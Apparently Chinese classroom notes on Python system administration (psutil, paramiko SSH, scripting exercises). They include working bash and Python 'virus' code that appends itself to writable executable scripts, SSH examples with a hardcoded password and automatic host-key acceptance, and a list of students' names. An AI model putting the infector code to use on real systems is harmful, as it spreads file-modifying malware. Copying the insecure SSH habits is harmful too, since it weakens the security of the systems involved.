<h4 id="popen类的使用" class="article-heading"><a href="#popen类的使用" class="headerlink" title="popen类的使用"></a>popen类的使用<a class="article-anchor" href="#popen类的使用" aria-hidden="true"></a></h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from subprocess import PIPE</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p=psutil.Popen([<span class="string">"/usr/bin/python"</span>,<span class="string">"-c"</span>,<span class="string">"print('hello')"</span>],stdout=PIPE)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.name()</span></span><br><span class="line">'python'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.username()</span></span><br><span class="line">'root'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.communicate()</span></span><br><span class="line">('hello\n', None)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p=psutil.Popen([<span class="string">"ping"</span>,<span class="string">"172.25.0.250"</span>],stdout=PIPE)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.status()</span></span><br><span class="line">'sleeping'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.uids()</span></span><br><span class="line">puids(real=0, effective=0, saved=0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.cpu_times()</span></span><br><span class="line">pcputimes(user=0.0, system=0.0, children_user=0.0, children_system=0.0)</span><br></pre></td></tr></tbody></table></figure>

<p>psutil提供的popen类的作用是获取用户启动的应用程序进程信息,以便跟踪程序进程的运行状态</p>
<ul>
<li>psutil.Popen([“/usr/bin/python”, “-c”, “print(‘hello’)”],stdout=PIPE) #通过psutil的Popen方法启动的应用程序,可以跟踪该程序运行的所有相关信息</li>
<li>p.cpu_times() #得到进程运行的CPU时间</li>
</ul>
<h1 id="python实例-paramkio模块实现ssh管理" class="article-heading"><a href="#python实例-paramkio模块实现ssh管理" class="headerlink" title="python实例-paramkio模块实现ssh管理"></a>python实例-paramkio模块实现ssh管理<a class="article-anchor" href="#python实例-paramkio模块实现ssh管理" aria-hidden="true"></a></h1><h2 id="ssh" class="article-heading"><a href="#ssh" class="headerlink" title="ssh"></a>ssh<a class="article-anchor" href="#ssh" aria-hidden="true"></a></h2><p>ssh允许你安全地连接到远程服务器，执行shell命令，传输文件，并在连接双方进行端口转发。</p>
<p>如果有一个命令地ssh工具，为什么还要通过编写脚本来使用ssh协议呢？<br>主要原因是这样做除了能够使用ssh协议地全部功能外，还能够使用python的全部功能。</p>
<p>ssh2协议就是通过paramkio的python模块实现的，通过python代码，可以连接到ssh服务器，并完成一些ssh任务。</p>
<h3 id="实践1——安装paramkio包" class="article-heading"><a href="#实践1——安装paramkio包" class="headerlink" title="实践1——安装paramkio包"></a>实践1——安装paramkio包<a class="article-anchor" href="#实践1——安装paramkio包" aria-hidden="true"></a></h3><ul>
<li>从共享中下载paramkio和PyCrypto</li>
<li>依赖模块：PyCrypto - The Python Cryptography Toolkit</li>
<li>依赖软件：python-dev</li>
</ul>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@foundation0 soft]# ls</span><br><span class="line">ipython-0.13.1         paramiko-1.7.5      psutil-4.3.1.tar.gz  pycrypto-2.6.1.tar.gz</span><br><span class="line">ipython-0.13.1.tar.gz  paramiko-1.7.5.zip  pycrypto-2.6.1</span><br><span class="line">[root@foundation0 soft]# yum install -y python-devel</span><br><span class="line">[root@foundation0 soft]# cd pycrypto-2.6.1</span><br><span class="line">[root@foundation0 pycrypto-2.6.1]# python setup.py install</span><br><span class="line">[root@foundation0 soft]# cd ../paramiko-1.7.5</span><br><span class="line">[root@foundation0 soft]# python setup.py install</span><br><span class="line">running install</span><br><span class="line">running bdist_egg</span><br><span class="line">running egg_info</span><br><span class="line">writing requirements to paramiko.egg-info/requires.txt</span><br><span class="line">writing paramiko.egg-info/PKG-INFO</span><br><span class="line">writing top-level names to paramiko.egg-info/top_level.txt</span><br><span class="line">writing dependency_links to paramiko.egg-info/dependency_links.txt</span><br><span class="line">reading manifest file 'paramiko.egg-info/SOURCES.txt'</span><br><span class="line">reading manifest template 'MANIFEST.in'</span><br><span class="line">writing manifest file 'paramiko.egg-info/SOURCES.txt'</span><br><span class="line">installing library code to build/bdist.linux-x86_64/egg</span><br><span class="line">running install_lib</span><br><span class="line">running build_py</span><br><span class="line">creating build/bdist.linux-x86_64/egg</span><br><span class="line">creating build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/__init__.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/agent.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/auth_handler.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/ber.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/buffered_pipe.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/channel.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/client.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/common.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/compress.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/config.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/dsskey.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/file.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/hostkeys.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/kex_gex.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/kex_group1.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/logging22.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/message.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/packet.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/pipe.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/pkey.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/primes.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/resource.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/rng.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/rng_posix.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/rng_win32.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/rsakey.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/server.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp_attr.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp_client.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp_file.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp_handle.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp_server.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/sftp_si.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/ssh_exception.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/transport.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/util.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">copying build/lib/paramiko/win_pageant.py -&gt; build/bdist.linux-x86_64/egg/paramiko</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/__init__.py to __init__.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/agent.py to agent.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/auth_handler.py to auth_handler.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/ber.py to ber.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/buffered_pipe.py to buffered_pipe.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/channel.py to channel.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/client.py to client.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/common.py to common.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/compress.py to compress.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/config.py to config.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/dsskey.py to dsskey.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/file.py to file.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/hostkeys.py to hostkeys.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/kex_gex.py to kex_gex.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/kex_group1.py to kex_group1.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/logging22.py to logging22.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/message.py to message.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/packet.py to packet.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/pipe.py to pipe.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/pkey.py to pkey.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/primes.py to primes.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/resource.py to resource.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/rng.py to rng.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/rng_posix.py to rng_posix.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/rng_win32.py to rng_win32.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/rsakey.py to rsakey.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/server.py to server.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp.py to sftp.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp_attr.py to sftp_attr.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp_client.py to sftp_client.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp_file.py to sftp_file.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp_handle.py to sftp_handle.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp_server.py to sftp_server.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/sftp_si.py to sftp_si.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/ssh_exception.py to ssh_exception.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/transport.py to transport.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/util.py to util.pyc</span><br><span class="line">byte-compiling build/bdist.linux-x86_64/egg/paramiko/win_pageant.py to win_pageant.pyc</span><br><span class="line">creating build/bdist.linux-x86_64/egg/EGG-INFO</span><br><span class="line">copying paramiko.egg-info/PKG-INFO -&gt; build/bdist.linux-x86_64/egg/EGG-INFO</span><br><span class="line">copying paramiko.egg-info/SOURCES.txt -&gt; build/bdist.linux-x86_64/egg/EGG-INFO</span><br><span class="line">copying paramiko.egg-info/dependency_links.txt -&gt; build/bdist.linux-x86_64/egg/EGG-INFO</span><br><span class="line">copying paramiko.egg-info/requires.txt -&gt; build/bdist.linux-x86_64/egg/EGG-INFO</span><br><span class="line">copying paramiko.egg-info/top_level.txt -&gt; build/bdist.linux-x86_64/egg/EGG-INFO</span><br><span class="line">zip_safe flag not set; analyzing archive contents...</span><br><span class="line">creating 'dist/paramiko-1.7.5-py2.7.egg' and adding 'build/bdist.linux-x86_64/egg' to it</span><br><span class="line">removing 'build/bdist.linux-x86_64/egg' (and everything under it)</span><br><span class="line">Processing paramiko-1.7.5-py2.7.egg</span><br><span class="line">Removing /usr/lib/python2.7/site-packages/paramiko-1.7.5-py2.7.egg</span><br><span class="line">Copying paramiko-1.7.5-py2.7.egg to /usr/lib/python2.7/site-packages</span><br><span class="line">paramiko 1.7.5 is already the active version in easy-install.pth</span><br><span class="line"></span><br><span class="line">Installed /usr/lib/python2.7/site-packages/paramiko-1.7.5-py2.7.egg</span><br><span class="line">Processing dependencies for paramiko==1.7.5</span><br><span class="line">Searching for pycrypto==2.6.1</span><br><span class="line">Best match: pycrypto 2.6.1</span><br><span class="line">Adding pycrypto 2.6.1 to easy-install.pth file</span><br><span class="line"></span><br><span class="line">Using /usr/lib64/python2.7/site-packages</span><br><span class="line">Finished processing dependencies for paramiko==1.7.5</span><br></pre></td></tr></tbody></table></figure>

<h3 id="实践2——编写python脚本连接到ssh服务器并远程执行命令" class="article-heading"><a href="#实践2——编写python脚本连接到ssh服务器并远程执行命令" class="headerlink" title="实践2——编写python脚本连接到ssh服务器并远程执行命令"></a>实践2——编写python脚本连接到ssh服务器并远程执行命令<a class="article-anchor" href="#实践2——编写python脚本连接到ssh服务器并远程执行命令" aria-hidden="true"></a></h3><h4 id="密码方式登录" class="article-heading"><a href="#密码方式登录" class="headerlink" title="密码方式登录"></a>密码方式登录<a class="article-anchor" href="#密码方式登录" aria-hidden="true"></a></h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程服务器</span></span><br><span class="line">hostname = ‘<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>’</span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line"><span class="comment">#用户名</span></span><br><span class="line">username = ‘Dominic’</span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line">password = ‘<span class="number">123456</span>’</span><br><span class="line"><span class="comment">#创建SSH连接日志文件（只保留前一次连接的详细日志，以前的日志会自动被覆盖）</span></span><br><span class="line">paramiko.util.log_to_file(‘paramiko.log’)</span><br><span class="line">s = paramiko.SSHClient()</span><br><span class="line"><span class="comment">#允许连接不在know_hosts文件中的主机</span></span><br><span class="line">s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"><span class="comment">#建立SSH连接</span></span><br><span class="line">s.connect(hostname,port,username,password)</span><br><span class="line">stdin,stdout,stderr = s.exec_command(‘df -h’)</span><br><span class="line"><span class="comment">#打印标准输出</span></span><br><span class="line"><span class="built_in">print</span> stdout.read()</span><br><span class="line">s.close()</span><br></pre></td></tr></tbody></table></figure>

<h4 id="基于证书方式的登录" class="article-heading"><a href="#基于证书方式的登录" class="headerlink" title="基于证书方式的登录"></a>基于证书方式的登录<a class="article-anchor" href="#基于证书方式的登录" aria-hidden="true"></a></h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">hostname = <span class="string">'172.25.0.11'</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line">username = <span class="string">'root'</span></span><br><span class="line">key_file = <span class="string">'/root/.ssh/id_rsa'</span></span><br><span class="line">key = paramiko.RSAKey.from_private_key_file(key_file)</span><br><span class="line"></span><br><span class="line">s = paramiko.SSHClient()</span><br><span class="line">s.load_system_host_keys()</span><br><span class="line">s.connect(hostname,port,username,pkey=key)</span><br><span class="line">stdin,stdout,stderr = s.exec_command(<span class="string">'df -h'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> stdout.read()</span><br><span class="line"><span class="built_in">print</span> stderr.read()</span><br><span class="line">s.close()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="python-脚本实战" class="article-heading"><a href="#python-脚本实战" class="headerlink" title="python 脚本实战"></a>python 脚本实战<a class="article-anchor" href="#python-脚本实战" aria-hidden="true"></a></h2><h3 id="for循环9-9" class="article-heading"><a href="#for循环9-9" class="headerlink" title="for循环9*9"></a>for循环9*9<a class="article-anchor" href="#for循环9-9" aria-hidden="true"></a></h3><h3 id="自定义模块，加载模式，使用模块的方法，数据（name）" class="article-heading"><a href="#自定义模块，加载模式，使用模块的方法，数据（name）" class="headerlink" title="自定义模块，加载模式，使用模块的方法，数据（name）"></a>自定义模块，加载模式，使用模块的方法，数据（<strong>name</strong>）<a class="article-anchor" href="#自定义模块，加载模式，使用模块的方法，数据（name）" aria-hidden="true"></a></h3><h3 id="使用subprocess模块完成病毒自我复制" class="article-heading"><a href="#使用subprocess模块完成病毒自我复制" class="headerlink" title="使用subprocess模块完成病毒自我复制"></a>使用subprocess模块完成病毒自我复制<a class="article-anchor" href="#使用subprocess模块完成病毒自我复制" aria-hidden="true"></a></h3><h3 id="使用subprocess模块完成批量添加用户" class="article-heading"><a href="#使用subprocess模块完成批量添加用户" class="headerlink" title="使用subprocess模块完成批量添加用户"></a>使用subprocess模块完成批量添加用户<a class="article-anchor" href="#使用subprocess模块完成批量添加用户" aria-hidden="true"></a></h3><h3 id="虚拟环境的搭建，激活和退出；第三方包的安装" class="article-heading"><a href="#虚拟环境的搭建，激活和退出；第三方包的安装" class="headerlink" title="虚拟环境的搭建，激活和退出；第三方包的安装"></a>虚拟环境的搭建，激活和退出；第三方包的安装<a class="article-anchor" href="#虚拟环境的搭建，激活和退出；第三方包的安装" aria-hidden="true"></a></h3><hr>
<p>病毒：（bash、python）</p>
<ol>
<li>判断当前病毒是否已经在运行，如果是，那么我就不再运行</li>
<li>病毒感染对象为bash|python脚本(file )(Python script|Bourne-Again shell script)</li>
<li>可执行的可写的[ -w file -a -x file ]</li>
<li>感染病毒的脚本执行的时候会额外输出”I am evil！”</li>
<li>病毒能够自我复制</li>
<li>如果已经被感染，就不再感染</li>
</ol>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line">test1=call(<span class="string">'test -f /tmp/.mybb_lock'</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> test1 == <span class="number">0</span>: exit()</span><br><span class="line">test2=call(<span class="string">'touch /tmp/.mybb_lock'</span>,shell=<span class="literal">True</span>)</span><br><span class="line">test_string=Popen(<span class="string">'find /root/bash/*'</span>,shell=<span class="literal">True</span>,stdout=PIPE).communicate()[<span class="number">0</span>]</span><br><span class="line">test_list=test_string.split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">del</span> test_list[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> test_list:</span><br><span class="line">	file_string=<span class="built_in">open</span>(file).read()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'mybb'</span> <span class="keyword">in</span> file_string: <span class="keyword">continue</span></span><br><span class="line">	test_wx=call([<span class="string">'test'</span>,<span class="string">'-w'</span>,file,<span class="string">'-a'</span>,<span class="string">'-x'</span>,file])</span><br><span class="line">	<span class="keyword">if</span> test_wx != <span class="number">0</span> : <span class="keyword">continue</span></span><br><span class="line">	test_python1=Popen([<span class="string">'file'</span>,file],stdout=PIPE)</span><br><span class="line">	test_python2=Popen([<span class="string">'grep'</span>,<span class="string">'Python script'</span>],stdin=test_python1.stdout,stdout=PIPE)</span><br><span class="line">	<span class="keyword">if</span> test_python2.communicate()[<span class="number">0</span>] == <span class="literal">None</span>:<span class="keyword">continue</span></span><br><span class="line">	string=<span class="built_in">open</span>(sys.argv[<span class="number">0</span>]).read()</span><br><span class="line">	infile_string=string.lstrip(<span class="string">'#!/usr/bin/env python'</span>).lstrip()</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">'a'</span>) <span class="keyword">as</span> infile:</span><br><span class="line">		infile.write(infile_string)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"I am superman"</span></span><br><span class="line">file_del=call(<span class="string">'rm -rf /tmp/.mybb_lock'</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>课堂练习：</p>
<ol>
<li>采集班级所有同学的姓名和学号，放在字典中，例如{0:’大宝’，1:’佩琦’}</li>
<li>全班同学玩杀人游戏，现在需要角色分配，如果学生的总数为3n+1个，则n为平民、杀手、警察的数量，法官只有1个；<br>如果学生的总数不是3n+1，而是3n+2或者3n+3，则将多余人加到平民中，例如3n+2，则平民的个数n+1，若为3n+3，则平民的个数n+2</li>
</ol>
<p>以上需求请用python脚本完成，随机分配角色。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">0 大宝</span><br><span class="line">1 江传晖</span><br><span class="line">3 汤雪磊</span><br><span class="line">4 周涛</span><br><span class="line">5 陆俊杰</span><br><span class="line">6 蒋帅</span><br><span class="line">7 晏继鹏</span><br><span class="line">9 龙清胜</span><br><span class="line">10 杨钧</span><br><span class="line">11 陆明</span><br><span class="line">13 巴荣军</span><br><span class="line">14 黄威</span><br><span class="line">17 申文涛</span><br><span class="line">18 胡立俊</span><br><span class="line">19 徐林</span><br><span class="line">20 李硕</span><br><span class="line">23 赖文龙</span><br><span class="line">24 罗鑫</span><br><span class="line">25 段永</span><br><span class="line">26 吴港</span><br><span class="line">36 李成鑫</span><br><span class="line">38 许光哲</span><br><span class="line">39 黄德鑫</span><br><span class="line">41 陈军甫</span><br><span class="line">42 鲁祖兴</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf_8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">a_dict={<span class="number">0</span>:<span class="string">'大宝'</span>,<span class="number">1</span>:<span class="string">'江传晖'</span>,<span class="number">3</span>:<span class="string">'汤雪磊'</span>,<span class="number">4</span>:<span class="string">'周涛'</span>,<span class="number">5</span>:<span class="string">'陆俊杰'</span>,<span class="number">6</span>:<span class="string">'蒋帅'</span>,<span class="number">7</span>:<span class="string">'晏继鹏'</span>,<span class="number">9</span>:<span class="string">'龙清胜'</span>,<span class="number">10</span>:<span class="string">'杨钧'</span>,<span class="number">11</span>:<span class="string">'陆明'</span>,<span class="number">13</span>:<span class="string">'巴荣军'</span>,<span class="number">14</span>:<span class="string">'黄威'</span>,<span class="number">17</span>:<span class="string">'申文涛'</span>,<span class="number">18</span>:<span class="string">'胡立俊'</span>,<span class="number">19</span>:<span class="string">'徐林'</span>,<span class="number">20</span>:<span class="string">'李硕'</span>,<span class="number">23</span>:<span class="string">'赖文龙'</span>,<span class="number">24</span>:<span class="string">'罗鑫'</span>,<span class="number">25</span>:<span class="string">'段永'</span>,<span class="number">26</span>:<span class="string">'吴港'</span>,<span class="number">36</span>:<span class="string">'李成鑫'</span>,<span class="number">38</span>:<span class="string">'许光哲'</span>,<span class="number">39</span>:<span class="string">'黄德鑫'</span>,<span class="number">41</span>:<span class="string">'陈军甫'</span>,<span class="number">42</span>:<span class="string">'鲁祖兴'</span>}</span><br><span class="line"><span class="comment">#print a_dict</span></span><br><span class="line">b_list=a_dict.values()</span><br><span class="line">n=<span class="built_in">len</span>(b_list)</span><br><span class="line"><span class="comment">#print n</span></span><br><span class="line"><span class="keyword">if</span> (n-<span class="number">1</span>)%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">	p_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line">	j_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line">	s_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> (n-<span class="number">1</span>)%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">	p_num=(n-<span class="number">1</span>)/<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">        j_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line">        s_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        p_num=(n-<span class="number">1</span>)/<span class="number">3</span>+<span class="number">2</span></span><br><span class="line">        j_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line">        s_num=(n-<span class="number">1</span>)/<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#b_list=a_dict.values()</span></span><br><span class="line">faguan=random.choice(b_list)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"法官：{}"</span>.<span class="built_in">format</span>(faguan)</span><br><span class="line">b_list.remove(faguan)</span><br><span class="line"><span class="comment">#print b_list</span></span><br><span class="line"><span class="comment">#print len(b_list)</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">'平民:'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p_num+<span class="number">1</span>):</span><br><span class="line">	p=random.choice(b_list)</span><br><span class="line">	b_list.remove(p)</span><br><span class="line">	sys.stdout.write(<span class="built_in">str</span>(p)+<span class="string">' '</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">'警察:'</span>)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,j_num+<span class="number">1</span>):</span><br><span class="line">        j=random.choice(b_list)</span><br><span class="line">        b_list.remove(j)</span><br><span class="line">        sys.stdout.write(<span class="built_in">str</span>(j)+<span class="string">' '</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">'杀手:'</span>)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,s_num+<span class="number">1</span>):</span><br><span class="line">        s=random.choice(b_list)</span><br><span class="line">        b_list.remove(s)</span><br><span class="line">        sys.stdout.write(<span class="built_in">str</span>(s)+<span class="string">' '</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">执行结果：</span><br><span class="line">[root@workstation0 geli]<span class="comment"># python game.py</span></span><br><span class="line">法官：段永</span><br><span class="line">平民:蒋帅 汤雪磊 许光哲 大宝 申文涛 晏继鹏 龙清胜 巴荣军</span><br><span class="line">警察:黄威 黄德鑫 李硕 杨钧 陆明 徐林 陆俊杰 赖文龙</span><br><span class="line">杀手:江传晖 周涛 李成鑫 陈军甫 鲁祖兴 胡立俊 罗鑫 吴港</span><br><span class="line">===========================================</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.采集班级所有同学的姓名和学号，放在字典中，例如{0:'大宝'，1:'佩琦'}</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createdict</span>():</span><br><span class="line">        <span class="keyword">global</span> stu_dict</span><br><span class="line">        stu_dict = {}</span><br><span class="line">        a_list = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>],<span class="string">'r'</span>).readlines()</span><br><span class="line">        <span 